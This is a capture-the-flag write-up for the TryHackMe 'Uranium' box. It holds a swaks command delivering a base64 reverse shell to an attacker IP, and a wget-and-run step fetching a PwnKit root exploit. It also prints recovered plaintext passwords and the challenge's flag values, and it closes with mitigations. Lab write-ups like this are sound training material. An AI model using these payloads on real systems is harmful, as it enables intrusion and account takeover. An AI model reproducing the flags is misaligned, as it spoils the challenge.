# THM — Uranium CTF

```
██╗   ██╗██████╗  █████╗ ███╗   ██╗██╗██╗   ██╗███╗   ███╗     ██████╗████████╗███████╗
██║   ██║██╔══██╗██╔══██╗████╗  ██║██║██║   ██║████╗ ████║    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██████╔╝███████║██╔██╗ ██║██║██║   ██║██╔████╔██║    ██║        ██║   █████╗  
██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║██║   ██║██║╚██╔╝██║    ██║        ██║   ██╔══╝  
╚██████╔╝██║  ██║██║  ██║██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║    ╚██████╗   ██║   ██║     
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚═════╝   ╚═╝   ╚═╝     
                             TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Postfix SMTP accepts mail for the local domain — crafted a MIME email with a reverse-shell attachment
- [x] A per-minute cron job auto-extracts and *executes* any mail attachment named `application*` — shell as `hakanbey`
- [x] Reverse-engineered a local chatbot client/server pair, recovered its password via `strace`
- [x] The chatbot conversation leaks `hakanbey`'s real SSH password in plain text
- [x] `sudo -l` shows `hakanbey` can run `/bin/bash` as `kral4` with no password needed for `kral4` itself
- [x] As `kral4`: read `user_2.txt`, then used a custom group-owned SUID `/bin/dd` to read `web_flag.txt`
- [x] `kral4` can't `sudo`, but `pkexec` is a vulnerable pre-patch build — PwnKit (CVE-2021-4034)
- [x] Verified glibc compatibility before transferring the exploit, then popped a **root shell** and read `root.txt`

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port and service discovery |
| swaks | Crafting and sending the malicious MIME email through Postfix |
| netcat | Receiving the reverse shell, and later transferring binaries and a PCAP off the box |
| strace | Proving the chatbot client was sending the password correctly despite appearing to hang |
| Wireshark | Independently recovering the chatbot password from a leaked PCAP |
| LinPEAS | Enumerating SUID binaries, cron jobs, and interesting files |
| `pkexec` / PwnKit (CVE-2021-4034) | Local privilege escalation to root |
| `readelf` | Verifying the exploit binary's required glibc version before transferring it |

---

## TL;DR

Postfix will relay mail for its own local domain, so a crafted email with a base64-encoded reverse-shell attachment named `application` lands in `hakanbey`'s mailbox — and a cron job that extracts and executes any attachment matching that name runs it automatically, giving a shell as `hakanbey`. A locally-running chatbot service, reverse-engineered with `strace` to get past a red-herring "hang," reveals a conversation where `kral4` reminds `hakanbey` of his own SSH password in plain text. From there, `sudo -l` shows `hakanbey` can become `kral4` with no extra password at all. As `kral4`, a group-owned SUID `/bin/dd` reads a flag `hakanbey` couldn't touch, and `kral4`'s inability to `sudo` points back at a vulnerable, unpatched `pkexec` — PwnKit, CVE-2021-4034 — which, after a quick glibc-compatibility check, hands over a root shell.

## Introduction

Uranium CTF is a hard, multi-stage Linux box built around believable operational mistakes rather than a single flashy exploit: an open mail relay that trusts its own domain, a cron job that treats "extracted from an email" as "safe to execute," a password reused between a toy chatbot and a real shell account, and a years-old `pkexec` left unpatched. None of the individual pieces are exotic — the box rewards methodically working through each user transition (`hakanbey → kral4 → root`) and re-checking old findings (an unusable SUID binary, a password-gated `sudo -l`) every time the privilege level changes.

## Recon

```bash
nmap -Pn -sV -sC -p- uraniumctf.thm
```

```
22/tcp   open  ssh      OpenSSH
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http
```

A quick manual SMTP probe confirms Postfix relays mail *within* its own domain while refusing it elsewhere:

```
MAIL FROM:<test@uraniumctf.thm>
RCPT TO:<root@uraniumctf.thm>
454 4.7.1 <root@uraniumctf.thm>: Relay access denied
```

Switching the sender and recipient domain to match the box's internal hostname (`uranium.thm` rather than the external `uraniumctf.thm`) is accepted — the mail server trusts its own local domain.

## Foothold

### A malicious email attachment

`swaks` makes crafting the MIME email far easier than typing raw SMTP by hand. The payload is a base64-encoded reverse shell, attached as a file named `application`:

```bash
swaks --to hakanbey@uranium.thm \
  --from hakanbey@uranium.thm \
  --header "Subject: Application" \
  --body "Please find my application attached." \
  --server 10.49.134.173 \
  --attach @application
```

```
-> Content-Disposition: attachment; filename="application"
-> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1Ni4xMjMvNDQ0NCAwPiYxIgo=
<- 250 2.0.0 Ok: queued as 696C34012E
```

### The auto-execute cron job

`hakanbey`'s crontab, read later from the resulting shell, explains why that specific filename matters:

```
* * * * * ripmime -i /var/mail/hakanbey -d /home/hakanbey/mail_file/ ; \
  find /home/hakanbey/mail_file/ -name "application*" -type f -exec chmod +x {} \; -exec {} \; ; \
  > /var/mail/hakanbey ; rm /home/hakanbey/mail_file/*
```

Every minute, it extracts attachments from `hakanbey`'s mailbox, `chmod +x`s and *executes* anything named `application*`, then wipes the mailbox and the extracted files. Any email attachment with that exact prefix is code execution as `hakanbey`.

## Shell / Initial Access

```bash
nc -lvnp 4444
```

Within a minute, the cron job fires and a reverse shell lands as `hakanbey`, reading `user_1.txt` during this initial foothold phase. The home directory holds two more leads:

```
chat_with_kral4   # ELF64 client binary
mail_file/        # leftover extraction artifacts
```

## Escalation Path

### Reverse-engineering the chatbot

A systemd unit shows a chatbot service running locally as `kral4`:

```ini
[Service]
User=kral4
ExecStart=/home/kral4/chat_with_hakanbey
```

`hakanbey`'s matching client, `chat_with_kral4`, connects to `127.0.0.1:1234`, sends `CLIENT`, and prompts for a password. The first attempts to run it appear to hang after the password is entered — but `strace` shows the password actually being sent correctly:

```
sendto(3, "CLIENT", 6, 0, NULL, 0) = 6
sendto(3, "MBMD1vdpjg3kGv6SsIz56VNG", 24, 0, NULL, 0) = 24
recvfrom(3, ...)
```

The real problem is stale client processes left over from earlier attempts. Killing them (`pkill -f chat_with_kral4`) and running it fresh gets a working chat session, and the conversation between `hakanbey` and `kral4` leaks a second, unrelated credential in plain text:

```
kral4: okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
```

That's `hakanbey`'s real SSH password — distinct from the chatbot's own password, confirmed independently later via a PCAP LinPEAS surfaces at `/var/log/hakanbey_network_log.pcap` (filtering Wireshark on `tcp contains "password"` shows the same conversation).

### The group-owned SUID binary, and the sudo shortcut

Enumeration turns up a `web` account and its flag, unreadable to `hakanbey`:

```
-rw------- 1 web web ... /var/www/html/web_flag.txt
```

...and a custom SUID `/bin/dd`:

```
-rwsr-x--- 1 web kral4 76000 Apr 23  2021 /bin/dd
```

Owned by `web` with the SUID bit set, but only executable by `web` or members of the `kral4` group — `hakanbey` is neither, so this is a dead end for now (see Escalation Path below). Checking `sudo -l` as `hakanbey` turns out to be the actual key:

```
User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
```

No password cracking needed — the sudoers rule explicitly authorizes this:

```bash
sudo -u kral4 /bin/bash
```

## Exploitation

### Picking up the pieces as kral4

With a shell as `kral4`, the earlier dead end becomes live: `user_2.txt` is sitting in the home directory, and the SUID `/bin/dd` — group-owned by `kral4` — now runs with effective UID `web`:

```bash
cat /home/kral4/user_2.txt
/bin/dd if=/var/www/html/web_flag.txt
```

```
thm{804d12e6d16189075db2d45449aeda5f}
thm{019d332a6a223a98b955c160b3e6750a}
```

### PwnKit for root

`sudo -l` as `kral4` demands a password that was never recovered — dead end. `find / -perm -4000` still shows `/usr/bin/pkexec`, and its installed `policykit-1` version (`0.105-20ubuntu0.18.04.5`) is one patch revision below the fix for **CVE-2021-4034 (PwnKit)**.

Before transferring an exploit built on an Arch host running a much newer glibc, the binary's actual requirement is checked rather than assumed:

```bash
readelf --version-info /tmp/PwnKit | grep GLIBC_
# highest required: GLIBC_2.14 — well below the target's 2.27
```

Compatible. Transfer it over and run it as `kral4`:

```bash
wget http://192.168.156.123:8000/PwnKit -O PwnKit
chmod +x PwnKit
./PwnKit
```

```
root@uranium:/tmp# cd /root
root@uranium:~# cat root.txt
thm{81498047439cc0426bafa1db5da699cd}
```

## Rabbit Holes

- **Docker as a privesc route:** `kral4` can start `docker`, but the daemon fails immediately with `failed to create NAT chain DOCKER` / an `iptables`-vs-`nftables` conflict on the attacking host. Fixing the attacker's firewall integration just to use Docker as a compilation sandbox wasn't worth it once a working prebuilt exploit was available.
- **Compiling PwnKit from source:** GCC wasn't installed on the target, and Docker was unusable (above), so static cross-compilation with Zig's musl target was tested as a fallback (`zig cc -target x86_64-linux-musl -static`). It worked, but became unnecessary once a prebuilt PwnKit binary was confirmed glibc-compatible with `readelf`.
- **`pkexec`'s empty changelog grep:** searching the Debian changelog for the CVE string by name returned nothing, which could be mistaken for "patched." An empty grep result is not proof of a patch — the actual installed version number against the known-fixed version is the real check.

## Flag

| Flag | Value |
|---|---|
| `user_1.txt` | Captured during the initial foothold (value not recorded in these notes) |
| `user_2.txt` | `thm{804d12e6d16189075db2d45449aeda5f}` |
| `web_flag.txt` | `thm{019d332a6a223a98b955c160b3e6750a}` |
| `root.txt` | `thm{81498047439cc0426bafa1db5da699cd}` |

## Mitigations

- **Open mail relay for the local domain:** Postfix accepting mail addressed to its own domain from any sender is exactly the gap this attack walks through. Restrict relaying to authenticated senders only.
- **Executing mail attachments automatically:** a cron job that `chmod +x`s and runs anything extracted from incoming mail is remote code execution by design. Never execute untrusted content pulled from an email pipeline — if automated attachment handling is required, sandbox it and never grant execute permission.
- **Password reuse between a toy service and a real account:** the chatbot leaking `hakanbey`'s actual SSH password in a casual conversation turned a low-stakes demo service into full account compromise. Credentials for different trust levels must never be the same value, and definitely not exchanged in plaintext chat logs.
- **Overly permissive sudoers / group-owned SUID binaries:** `(kral4) /bin/bash` with no password, and a SUID `dd` reachable by the `kral4` group, both skip intended access controls. Grant the minimum command needed (never a full shell), and audit SUID binaries' owning group as carefully as their owning user.
- **Unpatched `pkexec`:** CVE-2021-4034 is years old and trivially exploitable. Keep `policykit-1` current and treat any outstanding local-root CVE as a priority patch, not background noise.

## Key Takeaway

The most dangerous step on this box wasn't a vulnerability at all — it was a cron job treating "came from an email" as equivalent to "safe to run." Every later step compounds from there: a reused password, an unusable SUID binary that became usable the moment the privilege level changed, and a years-old CVE nobody patched. The transferable habit is to revisit every previously-dead-end finding (a SUID binary with the wrong group, a `sudo -l` demanding a password you don't have) the instant you land a new user — what's unusable now may become the whole escalation path one hop later.

## If I Did It Again

I'd check `sudo -l` immediately after landing each new shell, before spending time on password cracking or binary enumeration — it was the actual shortcut from `hakanbey` to `kral4`, found only after already investigating the chatbot in depth. I'd also verify a downloaded exploit's glibc requirements with `readelf` *before* attempting to compile a from-scratch alternative, rather than after — the Docker/Zig detour cost real time that the prebuilt binary made unnecessary.

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-23 | First writeup from my notes. |

[Back to top](#thm--uranium-ctf)
